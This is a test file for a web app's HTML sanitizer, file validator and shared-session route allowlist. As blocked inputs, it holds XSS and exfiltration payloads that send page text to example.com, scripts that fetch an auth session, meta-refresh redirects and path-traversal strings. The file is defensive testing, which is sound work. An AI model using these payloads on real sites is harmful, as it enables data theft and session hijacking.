import { test } from "node:test";
import assert from "node:assert/strict";
import { preparePrivateHtml } from "./html";
import { validatePrivateFile } from "./files";
import { sharedRequestAllowed } from "./sharedAccess";

test("private HTML keeps local content and static SVG while blocking outside navigation", () => {
  const result = preparePrivateHtml(`<style>p{color:red}</style><p>Original text</p><a href="#section">Local</a>
    <a href="https://example.com/leak">External label</a><svg viewBox="0 0 24 24"><path d="M1 1h10"/></svg>
    <audio controls src="guide.mp3"></audio>`);
  assert.ok(result.requiresAudio);
  assert.match(result.html, /Original text/);
  assert.match(result.html, /External label/);
  assert.doesNotMatch(result.html, /href="https:/);
  assert.doesNotMatch(result.html, /src="guide.mp3"/);
  assert.match(result.csp, /connect-src 'none'/);
  assert.match(result.csp, /form-action 'none'/);
  assert.match(result.csp, /media-src blob:/);
  assert.doesNotMatch(result.csp, /unsafe-eval|script-src 'unsafe-inline'|https:/);
});
test("unapproved navigation, network and parent-access scripts fail at upload", () => {
  for (const code of [
    "parent.document.body.innerHTML='x'", "fetch('/api/auth/session')",
    "location='https://example.com/?secret='+document.body.innerText",
    "navigator.sendBeacon('https://example.com',document.body.innerText)",
  ]) assert.throws(() => preparePrivateHtml(`<script>${code}</script>`), /unapproved script/);
  for (const html of [
    `<img src="https://example.com/tracker">`, `<p onclick="alert(1)">Test</p>`,
    `<iframe src="/api/auth/session"></iframe>`, `<form action="https://example.com"></form>`,
    `<svg><foreignObject><iframe></iframe></foreignObject></svg>`,
    `<script src="/api/auth/session"></script>`, `<base href="https://example.com">`,
  ]) assert.throws(() => preparePrivateHtml(html));
});
test("HTML refresh metadata is removed and CSP precedes uploaded styles", () => {
  const result = preparePrivateHtml(`<meta http-equiv="refresh" content="0;url=https://example.com"><style>@import 'https://example.com';</style><p>Hello</p>`);
  assert.doesNotMatch(result.html, /http-equiv="refresh"/);
  assert.ok(result.html.indexOf("Content-Security-Policy") < result.html.indexOf("<style>"));
});
test("file validation rejects bad extensions, types and empty payloads", () => {
  assert.throws(() => validatePrivateFile("audio", "bad.mp3", Buffer.from("not audio")));
  assert.throws(() => validatePrivateFile("transcript", "script.docx", Buffer.from("not zip")));
  assert.throws(() => validatePrivateFile("html", "../secret.html", Buffer.from("<p>hi</p>")));
  assert.throws(() => validatePrivateFile("html", "empty.html", Buffer.alloc(0)));
});
test("shared sessions have a narrow server-side allowlist", () => {
  assert.equal(sharedRequestAllowed("GET", "/api/private-pages"), true);
  assert.equal(sharedRequestAllowed("POST", "/api/auth/shared/logout"), true);
  for (const path of ["/api/cms/users", "/api/portal/documents", "/api/portal/constellation/invoices", "/oauth/authorize",
    "/oauth/token", "/api/auth/reset-password", "/api/admin/client-orgs", "/api/auth/sign-in", "/api/auth/me"]) {
    assert.equal(sharedRequestAllowed("GET", path), false, path);
    assert.equal(sharedRequestAllowed("POST", path), false, path);
  }
  assert.equal(sharedRequestAllowed("POST", "/api/private-pages"), false);
  assert.equal(sharedRequestAllowed("GET", "/api/private-pages/../../cms/users"), false);
});
